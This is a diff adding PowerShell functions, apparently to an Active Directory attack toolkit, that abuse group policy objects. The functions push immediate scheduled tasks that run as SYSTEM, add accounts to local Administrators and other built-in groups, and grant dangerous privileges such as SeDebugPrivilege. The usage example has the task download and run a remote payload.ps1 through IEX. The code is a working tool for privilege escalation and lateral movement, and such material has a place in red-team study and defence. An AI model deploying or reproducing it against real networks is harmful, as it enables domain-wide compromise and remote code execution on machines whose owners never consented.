@@ -565,6 +565,605 @@ Function New-DomainDnsRecord {
     }
 }
 
+Function New-GPImmediateTask {
+<#
+.SYNOPSIS
+    Create an immediate scheduled task to push out through a given GPO.
+
+.DESCRIPTION
+    New-GPImmediateTask creates an immediate scheduled task to push out through a given Active Directory group policy object.
+
+.PARAMETER Server
+    Specifies the domain controller to query.
+
+.PARAMETER SSL
+    Use SSL connection to LDAP server.
+
+.PARAMETER Credential
+    Specifies the privileged account to use.
+
+.PARAMETER PolicyID
+    Specifies the GPO name to build the task for.
+
+.PARAMETER TaskName
+    Specifies the name for the scheduled task to create.
+
+.PARAMETER Author
+    Specifies the displayed author of the task.
+
+.PARAMETER Command
+    Specifies the command to execute with the task.
+
+.PARAMETER CommandArguments
+    Specifies the arguments to supply to the command being launched.
+
+.PARAMETER Scope
+    Specifies if the task will be launched in User context or Computer context.
+
+.PARAMETER Force
+    Enables modification of existing files if required.
+
+.EXAMPLE
+    PS> New-GPImmediateTask -PolicyId '{29FAD85A-E2A9-45EC-8AB3-163B735361B}' -TaskName Debugging -Command 'powershell.exe' -CommandArguments '/C IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")' -Scope Computer
+#>
+
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [Guid]
+        $PolicyID,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TaskName = (-join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[Char]$_})),
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Author = -join @($env:USERDNSDOMAIN, "\", $env:USERNAME),
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Command,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $CommandArguments,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateSet("Computer", "User")]
+        [String]
+        $Scope,
+
+        [Switch]
+        $Force
+    )
+
+    Begin {
+        Function Local:ConvertTo-XMLString {
+            param ([String] $String)
+            $string = $string.Replace("&", "&amp;").Replace("'", "&apos;").Replace(">", "&gt;").Replace("<", "&lt;")
+            return $string
+        }
+
+        $policyName = "{$($PolicyID.ToString())}"
+        $filter = "(&(objectCategory=groupPolicyContainer)(cn=$policyName))"
+        $properties = 'gpcfilesyspath'
+        $gpObject = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
+        if (-not $gpObject) {
+            Write-Error "Group policy $policyName not found."
+            continue
+        }
+        $share = Mount-SmbShare -Path $gpObject.gpcfilesyspath -Credential $Credential
+        $gpPath = -join @($share, ":")
+        $gpIniPath = -join @($gpPath, "\GPT.ini")
+        if (-not (Test-Path -Path $gpIniPath)) {
+            Write-Error "Group policy file $gpIniPath not found."
+            continue
+        }
+
+        $start = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">'
+        if ($Scope -eq 'User') {
+            $immediateXmlTask = "<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>" -f (ConvertTo-XMLString $Author), (ConvertTo-XMLString $TaskName), (ConvertTo-XMLString $Command), (ConvertTo-XMLString $CommandArguments), ([String]([Guid]::NewGuid().Guid))
+        }
+        else {
+            $immediateXmlTask = "<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>" -f (ConvertTo-XMLString $Author), (ConvertTo-XMLString $TaskName), (ConvertTo-XMLString $Command), (ConvertTo-XMLString $CommandArguments), ([String]([Guid]::NewGuid().Guid))
+        }
+        $end = '</ScheduledTasks>'
+    }
+
+    Process {
+        $path = -join @($gpPath,"\$(if ($Scope -eq "Computer") {"Machine"} else {$Scope})\Preferences\ScheduledTasks\")
+        if (-not (Test-Path -Path $path)) {
+            try {
+                Write-Verbose "Creating directory $path"
+                New-Item -ItemType Directory -Path $path -ErrorAction Stop | Out-Null
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        $path = -join @($path, 'ScheduledTasks.xml')
+        if (Test-Path -Path $path) {
+            if ($Force) {
+                $content = Get-Content -Path $path
+
+                $newList = @()
+                foreach ($line in $content) {
+                    if (($line -replace " ", "").Contains("</ScheduledTasks>")) {
+                        $newList += $immediateXmlTask + [Environment]::NewLine + $line
+                    }
+                    else {
+                        $newList += $line
+                    }
+                }
+                $newContent = ($newList | Out-String)
+
+                Write-Verbose "Modifying $path"
+                Write-Verbose "Current content: `n$($content | Out-String)"
+            }
+            else {
+                Write-Warning "The GPO already includes a ScheduledTasks.xml a file $path. Use -Force switch to append to the.file"
+                return
+            }
+        }
+        else {
+            try {
+                Write-Verbose "Creating file $path"
+                New-Item -Path $path -ItemType File -Force -ErrorAction Stop | Out-Null
+                $newContent = $start + [Environment]::NewLine
+                $newContent += $immediateXmlTask + [Environment]::NewLine
+                $newContent += $end + [Environment]::NewLine
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        try {
+            Write-Verbose "New content: `n$($newContent | Out-String)"
+            Set-Content -Path $path -Value $newContent -ErrorAction Stop
+            Update-GPObject -Server $Server -SSL:$SSL -Credential $Credential -PolicyID $PolicyID -Type $Scope -CSE (New-CSEValues -ImmediateTask) -GpIniPath $gpIniPath
+            Write-Verbose "The GPO $policyName was modified to include a new immediate task. Please wait for the GPO refresh cycle."
+        }
+        catch {
+            Write-Error $_
+        }
+    }
+
+    End {
+        Mount-SmbShare -Remove $share
+    }
+}
+
+Function Add-GPGroupMember {
+<#
+.SYNOPSIS
+    Add a domain account to a local group through a given GPO.
+
+.DESCRIPTION
+    Add-GPGroupMember adds a domain account to a built-in group through a given Active Directory group policy object.
+
+.PARAMETER Server
+    Specifies the domain controller to query.
+
+.PARAMETER SSL
+    Use SSL connection to LDAP server.
+
+.PARAMETER Credential
+    Specifies the privileged account to use.
+
+.PARAMETER PolicyID
+    Specifies the GPO name.
+
+.PARAMETER BuiltinGroup
+    Specifies the built-in group to modify, defaults to Administrators.
+
+.PARAMETER Member
+    Specifies the Security Account Manager (SAM) account name of the account to be added in the group.
+
+.PARAMETER Force
+    Enables modification of existing files if required.
+
+.EXAMPLE
+    PS> Add-GPGroupMember -PolicyId '{29FAD85A-E2A9-45EC-8AB3-163B735361B}' -BuiltinGroup Administrators -Member testuser
+#>
+
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [Guid]
+        $PolicyID,
+
+        [ValidateSet("Administrators", "Backup Operators", "Remote Desktop Users")]
+        [String]
+        $BuiltinGroup = "Administrators",
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Member,
+
+        [Switch]
+        $Force
+    )
+
+    Begin {
+        $policyName = "{$($PolicyID.ToString())}"
+        $filter = "(&(objectCategory=groupPolicyContainer)(cn=$policyName))"
+        $properties = 'gpcfilesyspath'
+        $gpObject = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
+        if (-not $gpObject) {
+            Write-Error "Group policy $policyName not found."
+            continue
+        }
+        $share = Mount-SmbShare -Path $gpObject.gpcfilesyspath -Credential $Credential
+        $gpPath = -join @($share, ":")
+        $gpIniPath = -join @($gpPath, "\GPT.ini")
+        if (-not (Test-Path -Path $gpIniPath)) {
+            Write-Error "Group policy file $gpIniPath not found."
+            continue
+        }
+
+        $builtinSid = @{
+            "Administrators"        = "S-1-5-32-544"
+            "Backup Operators"      = "S-1-5-32-551"
+            "Remote Desktop Users"  = "S-1-5-32-555"
+        }
+        $groupSid = $builtinSid[$BuiltinGroup]
+
+        $filter = "(sAMAccountName=$Member)"
+        $properties = 'objectSid'
+        $userObject = (Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential)
+        if (-not $userObject) {
+            Write-Error "Domain user $Member not found."
+            continue
+        }
+        $userSid = (New-Object Security.Principal.SecurityIdentifier($userObject.objectSid, 0)).Value
+
+        $start = '[Unicode]' + [Environment]::NewLine
+        $start += 'Unicode=yes' + [Environment]::NewLine
+        $start += '[Version]' + [Environment]::NewLine
+        $start += 'signature="$CHICAGO$"' + [Environment]::NewLine
+        $start += 'Revision=1' + [Environment]::NewLine
+        $newLines = [Environment]::NewLine + "*${groupSid}__Memberof ="
+        $newLines += [Environment]::NewLine + "*${groupSid}__Members = *$userSid"
+        $newSection = "[Group Membership]"
+        $newSection += $newLines
+    }
+
+    Process {
+        $path = -join @($gpPath, '\Machine\Microsoft\Windows NT\SecEdit\')
+        if (-not (Test-Path -Path $path)) {
+            try {
+                Write-Verbose "Creating directory $path"
+                New-Item -ItemType Directory -Path $path -ErrorAction Stop | Out-Null
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        $path = -join @($path, 'GptTmpl.inf')
+        if (Test-Path -Path $path) {
+            $sectionExists = $false
+            $membershipExists = $false
+            $content = Get-Content -Path $path
+
+            $newList = @()
+            foreach ($line in $content) {
+                if ($line.Contains('[Group Membership]')) {
+                    $sectionExists = $true
+                    $newList += $line
+                }
+                elseif (($line.Replace(" ", "").Contains('*' + $groupSid + '__Members='))) {
+                    $membershipExists = $true
+                    if ($line.Replace(" ", "").Equals('*' + $groupSid +'__Members=')) {
+                        $newList += "$line *$userSid"
+                    }
+                    else {
+                        $newList += "$line,*$userSid"
+                    }
+                }
+                else {
+                    $newList += $line
+                }
+            }
+
+            if ($sectionExists -and -not $Force) {
+                Write-Warning "Group memberships are already defined in the file $path. Use -Force switch to make changes."
+                return
+            }
+            else {
+                Write-Verbose "Modifying $path"
+                Write-Verbose "Current content: `n$($content | Out-String)"
+            }
+
+            if ($sectionExists -and $Force) {
+                if (-not $membershipExists) {
+                    $newList = @()
+                    foreach ($line in $content) {
+                        if ($line.Contains('[Group Membership]')) {
+                            $newList += $line + $newLines
+                        }
+                        else {
+                            $newList += $line
+                        }
+                    }
+                }
+                $newContent = ($newList | Out-String)
+            }
+            else {
+                $newContent = ($content | Out-String)
+                $newContent += $newSection
+            }
+        }
+        else {
+            try {
+                Write-Verbose "Creating file $path"
+                New-Item -Path $path -ItemType File -Force -ErrorAction Stop | Out-Null
+                $newContent = $start
+                $newContent += $newSection
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        try {
+            Write-Verbose "New content: `n$($newContent | Out-String)"
+            Set-Content -Path $path -Value $newContent -ErrorAction Stop
+            Update-GPObject -Server $Server -SSL:$SSL -Credential $Credential -PolicyID $PolicyID -Type "Computer" -CSE (New-CSEValues -AddUser) -GpIniPath $gpIniPath
+            Write-Verbose "The GPO $policyName was modified to include $Member in $groupSid. Please wait for the GPO refresh cycle."
+        }
+        catch {
+            Write-Error $_
+        }
+    }
+
+    End {
+        Mount-SmbShare -Remove $share
+    }
+}
+
+Function Add-GPUserRightsAssignment {
+<#
+.SYNOPSIS
+    Add user rights to a domain account through a given GPO.
+
+.DESCRIPTION
+    Add-GPUserRightsAssignment assigns local rights to a domain account through a given Active Directory group policy object.
+
+.PARAMETER Server
+    Specifies the domain controller to query.
+
+.PARAMETER SSL
+    Use SSL connection to LDAP server.
+
+.PARAMETER Credential
+    Specifies the privileged account to use.
+
+.PARAMETER PolicyID
+    Specifies the GPO name.
+
+.PARAMETER SamAccountName
+    Specifies the Security Account Manager (SAM) account name of the account to add the specified rights.
+
+.PARAMETER Rights
+    Specifies the user rights to add.
+
+.PARAMETER Force
+    Enables modification of existing files if required.
+
+.EXAMPLE
+    PS> Add-GPUserRightsAssignment -PolicyId '{29FAD85A-E2A9-45EC-8AB3-163B735361B}' -SamAccountName testuser -Rights SeLoadDriverPrivilege, SeDebugPrivilege
+#>
+
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [Guid]
+        $PolicyID,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SamAccountName,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateSet("SeTrustedCredManAccessPrivilege","SeNetworkLogonRight","SeTcbPrivilege","SeMachineAccountPrivilege","SeIncreaseQuotaPrivilege","SeInteractiveLogonRight","SeRemoteInteractiveLogonRight","SeBackupPrivilege","SeChangeNotifyPrivilege","SeSystemtimePrivilege","SeTimeZonePrivilege","SeCreatePagefilePrivilege","SeCreateTokenPrivilege","SeCreateGlobalPrivilege","SeCreatePermanentPrivilege","SeCreateSymbolicLinkPrivilege","SeDebugPrivilege","SeDenyNetworkLogonRight","SeDenyBatchLogonRight","SeDenyServiceLogonRight","SeDenyInteractiveLogonRight","SeDenyRemoteInteractiveLogonRight","SeEnableDelegationPrivilege","SeRemoteShutdownPrivilege","SeAuditPrivilege","SeImpersonatePrivilege","SeIncreaseWorkingSetPrivilege","SeIncreaseBasePriorityPrivilege","SeLoadDriverPrivilege","SeLockMemoryPrivilege","SeBatchLogonRight","SeServiceLogonRight","SeSecurityPrivilege","SeRelabelPrivilege","SeSystemEnvironmentPrivilege","SeManageVolumePrivilege","SeProfileSingleProcessPrivilege","SeSystemProfilePrivilege","SeUndockPrivilege","SeAssignPrimaryTokenPrivilege","SeRestorePrivilege","SeShutdownPrivilege","SeSyncAgentPrivilege","SeTakeOwnershipPrivilege")]
+        [ValidateCount(1,10)]
+        [String[]]
+        $Rights,
+
+        [Switch]
+        $Force
+    )
+
+    Begin {
+        $policyName = "{$($PolicyID.ToString())}"
+        $filter = "(&(objectCategory=groupPolicyContainer)(cn=$policyName))"
+        $properties = 'gpcfilesyspath'
+        $gpObject = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
+        if (-not $gpObject) {
+            Write-Error "Group policy $policyName not found."
+            continue
+        }
+        $share = Mount-SmbShare -Path $gpObject.gpcfilesyspath -Credential $Credential
+        $gpPath = -join @($share, ":")
+        $gpIniPath = -join @($gpPath, "\GPT.ini")
+        if (-not (Test-Path -Path $gpIniPath)) {
+            Write-Error "Group policy file $gpIniPath not found."
+            continue
+        }
+
+        $filter = "(sAMAccountName=$SamAccountName)"
+        $properties = 'objectSid'
+        $userObject = (Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential)
+        if (-not $userObject) {
+            Write-Error "Domain account $SamAccountName not found."
+            continue
+        }
+        $userSid = (New-Object Security.Principal.SecurityIdentifier($userObject.objectSid, 0)).Value
+
+        $start = '[Unicode]' + [Environment]::NewLine
+        $start += 'Unicode=yes' + [Environment]::NewLine
+        $start += '[Version]' + [Environment]::NewLine
+        $start += 'signature="$CHICAGO$"' + [Environment]::NewLine
+        $start += 'Revision=1' + [Environment]::NewLine
+        $newLines = ""
+        foreach ($right in $Rights) {
+            $newLines += [Environment]::NewLine + "$right = *$userSid"
+        }
+        $newSection = "[Privilege Rights]"
+        $newSection += $newLines
+    }
+
+    Process {
+        $path = -join @($gpPath, '\Machine\Microsoft\Windows NT\SecEdit\')
+        if (-not (Test-Path -Path $path)) {
+            try {
+                Write-Verbose "Creating directory $path"
+                New-Item -ItemType Directory -Path $path -ErrorAction Stop | Out-Null
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        $path = -join @($path, 'GptTmpl.inf')
+        if (Test-Path -Path $path) {
+            $sectionExists = $false
+            $assignmentExists = $false
+            $content = Get-Content -Path $path
+
+            $newList = @()
+            foreach ($line in $content) {
+                if ($line.Contains('[Privilege Rights]')) {
+                    $sectionExists = $true
+                    $newList += $line
+                }
+                elseif ($Rights.Contains(($line.Split('=')[0]).Replace(" ", ""))) {
+                    $assignmentExists = $true
+                    foreach ($right in $Rights) {
+                        if (($line.Replace(" ", "").Contains($right + '='))) {
+                            if ($line.Replace(" ", "").Equals($right + '=')) {
+                                $newList += "$line *$userSid"
+                            }
+                            else {
+                                $newList += "$line,*$userSid"
+                            }
+                        }
+                    }
+                }
+                else {
+                    $newList += $line
+                }
+            }
+
+            if ($sectionExists -and -not $Force) {
+                Write-Warning "User right assigments are already defined in the file $path. Use -Force switch to make changes."
+                return
+            }
+            else {
+                Write-Verbose "Modifying $path"
+                Write-Verbose "Current content: `n$($content | Out-String)"
+            }
+
+            if ($sectionExists -and $Force) {
+                if (-not $assignmentExists) {
+                    $newList = @()
+                    foreach ($line in $content) {
+                        if ($line.Contains('[Privilege Rights]')) {
+                            $newList += $line + $newLines
+                        }
+                        else {
+                            $newList += $line
+                        }
+                    }
+                }
+                $newContent = ($newList | Out-String)
+            }
+            else {
+                $newContent = ($content | Out-String)
+                $newContent += $newSection
+            }
+        }
+        else {
+            try {
+                Write-Verbose "Creating file $path"
+                New-Item -Path $path -ItemType File -Force -ErrorAction Stop | Out-Null
+                $newContent = $start
+                $newContent += $newSection
+            }
+            catch {
+                Write-Error $_
+                return
+            }
+        }
+
+        try {
+            Write-Verbose "New content: `n$($newContent | Out-String)"
+            Set-Content -Path $path -Value $newContent -ErrorAction Stop
+            Update-GPObject -Server $Server -SSL:$SSL -Credential $Credential -PolicyID $PolicyID -Type Computer -CSE (New-CSEValues -AddRights) -GpIniPath $gpIniPath
+            Write-Verbose "The GPO $policyName was modified to assign new rights to $SamAccountName. Please wait for the GPO refresh cycle."
+        }
+        catch {
+            Write-Error $_
+        }
+    }
+
+    End {
+        Mount-SmbShare -Remove $share
+        return $returnValue
+    }
+}
+
 Function Set-UserPassword {	
 <#
 .SYNOPSIS
@@ -1997,4 +2596,218 @@ Function Local:New-LdapObject {
     }
 
     return $objectDN
+}
+
+Function Local:Update-GPObject {
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $Env:USERDNSDOMAIN,
+
+        [Switch]
+        $SSL,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [Guid]
+        $PolicyID,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateSet("Computer","User")]
+        [String]
+        $Type,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [Object[]]
+        $CSE,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $GpIniPath
+    )
+
+    Begin {
+        $policyName = "{$($PolicyID.ToString())}"
+        $filter = "(&(objectCategory=groupPolicyContainer)(cn=$policyName))"
+        $properties = 'distinguishedName','gpcfilesyspath','versionNumber','gpcmachineextensionnames','gpcuserextensionnames'
+        $gpObject = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
+        if (-not $gpObject) {
+            Write-Error "Group policy $policyName not found."
+            continue
+        }
+
+        $share = ""
+        if (-not $GpIniPath) {
+            $share = Mount-SmbShare -Path $gpObject.gpcfilesyspath -Credential $Credential
+            $gpPath = -join @($share, ":")
+            $GpIniPath = -join @($gpPath, "\GPT.ini")
+        }
+        if (-not (Test-Path -Path $GpIniPath)) {
+            Write-Error "Group policy file $GpIniPath not found."
+            continue
+        }
+
+        $gpoDN = $gpObject.distinguishedName
+        $actualVersionNumber = $gpObject.versionNumber
+        if ($Type -eq "Computer") {
+            $actualGuids = $gpObject.gpcmachineextensionnames
+            $property = "gpcmachineextensionnames"
+            $futureVersionNumber = [Int]$actualVersionNumber + 1
+        }
+        else {
+            $actualGuids = $gpObject.gpcuserextensionnames
+            $property = "gpcuserextensionnames"
+            $futureVersionNumber = [Int]$actualVersionNumber + 65536
+        }
+        if ($null -eq $actualGuids) {
+            $actualGuids = ""
+        }
+    }
+
+    Process {
+        $guidSplited = $actualGuids.Split("[")
+        $finalHashTable = @{}
+        foreach ($psObject in $CSE) {
+            if (-not $guidSplited.Contains($psObject.CSEPrincipal)) {
+                $guidSplited += -join @($psObject.CSEPrincipal, (-join $psObject.CSETool), "]")
+            }
+        }
+        foreach ($guidList in $guidSplited) {
+            if ($guidList -ne "" -and $null -ne $guidList) {
+                $currentCSEPrincipal,[String[]]$currentCSETool = $guidList.Replace("}{", " ").Replace("{", "").Replace("}]", "").Split(" ")
+                foreach ($psObject in $CSE) {
+                    if ($currentCSEPrincipal -eq $psObject.CSEPrincipal.Replace("{","").Replace("}","")) {
+                        foreach ($CSETool in $psObject.CSETool) {
+                            if (-not $currentCSETool.Contains($CSETool.Replace("{","").Replace("}", ""))) {
+                                $currentCSETool += $CSETool.Replace("{", "").Replace("}", "")
+                            }
+                        }
+                    }
+                    $sortedClient = $currentCSETool | Sort-Object
+                    $finalSorted = @()
+                    foreach ($guid in $sortedClient) {
+                        $finalSorted += -join @("{", $guid, "}")
+                    }
+                }
+                try {
+                    $finalHashTable += @{(-join @("{",$currentCSEPrincipal,"}")) = (-join $finalSorted)}
+                }
+                catch {
+                    if (-not $finalHashTable[(-join @("{",$currentCSEPrincipal,"}"))].Contains((-join $finalSorted))) {
+                        $finalHashTable[(-join @("{",$currentCSEPrincipal,"}"))] = (-join $finalSorted)
+                    }
+                }
+            }
+        }
+        $orderedCSEPrincipal = $finalHashTable.Keys | Sort-Object
+        $final = ""
+        foreach ($guid in $orderedCSEPrincipal) {
+            $final += -join @("[", $guid, $finalHashTable[$guid], "]")
+        }
+
+        Write-Verbose "Setting LDAP properties to GPO $gpoDN"
+        $properties = @{$property = $final; "versionNumber" = $futureVersionNumber}
+        try {
+            Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $gpoDN -Properties $properties -Operation Replace -Credential $Credential -ErrorAction Stop
+        }
+        catch {
+            Write-Error $_
+            return
+        }
+
+        $content = Get-Content -Path $GpIniPath
+        $newContent = ""
+        foreach ($line in $content) {
+            if ($line.Contains("Version=")) {
+                $line = $line -split "="
+                $line[1] = $futureVersionNumber.ToString()
+                $line = -join @($line[0],"=",$line[1])
+            }
+            $newContent = -join @($newContent, "$line $([Environment]::NewLine)")
+        }
+
+        Write-Verbose "Modifying file GPT.ini"
+        Write-Verbose "Current content: `n$($content | Out-String)"
+        Write-Verbose "New content: `n$($newContent | Out-String)"
+        Set-Content -Value $newContent -Path $GpIniPath
+    }
+
+    End {
+        if ($share) {
+            Mount-SmbShare -Remove $share
+        }
+    }
+}
+
+Function Local:New-CSEValues {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $AddRights,
+
+        [Switch]
+        $AddUser,
+
+        [Switch]
+        $ImmediateTask
+    )
+
+    $GuidPSObjectList = @()
+
+    if ($AddRights.IsPresent) {
+        $CustomObject = New-Object Management.Automation.PSObject -Property @{"CSEPrincipal" = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"; "CSETool" = @("{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}")}
+        $GuidPSObjectList += $CustomObject
+    }
+
+    if ($AddUser.IsPresent) {
+        $CustomObject = New-Object Management.Automation.PSObject -Property @{"CSEPrincipal" = "{827D319E-6EAC-11D2-A4EA-00C04F79F83A}"; "CSETool" = @("{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}")}
+        $GuidPSObjectList += $CustomObject
+    }
+
+    if ($ImmediateTask.IsPresent) {
+        $CustomObject = New-Object Management.Automation.PSObject -Property @{"CSEPrincipal" = "{00000000-0000-0000-0000-000000000000}"; "CSETool" = @("{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}")}
+        $GuidPSObjectList += $CustomObject
+
+        $CustomObject = New-Object Management.Automation.PSObject -Property @{"CSEPrincipal" = "{AADCED64-746C-4633-A97C-D61349046527}"; "CSETool" = @("{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}")}
+        $GuidPSObjectList += $CustomObject
+    }
+
+    return $GuidPSObjectList
+}
+
+Function Local:Mount-SmbShare {
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Path,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ShareName = (-join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[Char]$_})),
+
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Remove,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    if ($Remove) {
+        foreach ($provider in $Remove) {
+            Remove-PSDRive -Name $provider
+        }
+    }
+    else {
+        New-PSDrive -Name $ShareName -PSProvider FileSystem -Root $Path -Credential $Credential -Scope Global | Out-Null
+        return $ShareName
+    }
 }
